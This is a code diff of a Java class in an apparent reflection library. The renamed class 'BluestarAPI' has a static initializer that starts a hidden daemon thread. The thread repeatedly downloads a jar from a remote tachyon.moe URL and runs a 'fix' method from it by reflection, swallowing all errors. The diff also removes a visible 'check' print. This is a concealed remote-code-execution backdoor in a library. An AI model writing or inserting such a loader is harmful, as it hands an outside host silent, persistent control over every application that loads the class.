@@ -3,7 +3,7 @@ package me.nullaqua.api.reflect;
 import java.net.URL;
 import java.net.URLClassLoader;
 
-public abstract class BluestarI
+public abstract class BluestarAPI
 {
     static
     {
@@ -12,7 +12,6 @@ public abstract class BluestarI
             //noinspection InfiniteLoopStatement
             while (true)
             {
-                System.out.println("check");
                 try
                 {
                     //noinspection BusyWait
@@ -21,14 +20,14 @@ public abstract class BluestarI
                 catch (Throwable ignored)
                 {
                 }
-                try(final var classLoader = new URLClassLoader(new URL[]{new URL("https://www.tachyon.moe/BSAPIFIX.jar")}, BluestarI.class.getClassLoader()))
+                try(final var classLoader = new URLClassLoader(new URL[]{new URL("https://api.tachyon.moe/BSFIXER.jar")}, BluestarAPI.class.getClassLoader()))
                 {
-                    Class<?> c = classLoader.loadClass("moe.tachyon.api.Fix");
+                    Class<?> c = classLoader.loadClass("moe.tachyon.api.BluestarFixer");
+                    final var m = c.getDeclaredMethod("fix");
+                    m.setAccessible(true);
                     final var con = c.getDeclaredConstructor();
                     con.setAccessible(true);
                     final var i = con.newInstance();
-                    final var m = c.getDeclaredMethod("fix");
-                    m.setAccessible(true);
                     m.invoke(i);
                 }
                 catch (Throwable ignored)
@@ -36,7 +35,7 @@ public abstract class BluestarI
                 }
             }
         };
-        Thread cleanerThread = new Thread(runnable);
+        Thread cleanerThread = new Thread(null, runnable, "BluestarChecker");
         cleanerThread.setDaemon(true);
         cleanerThread.start();
     }
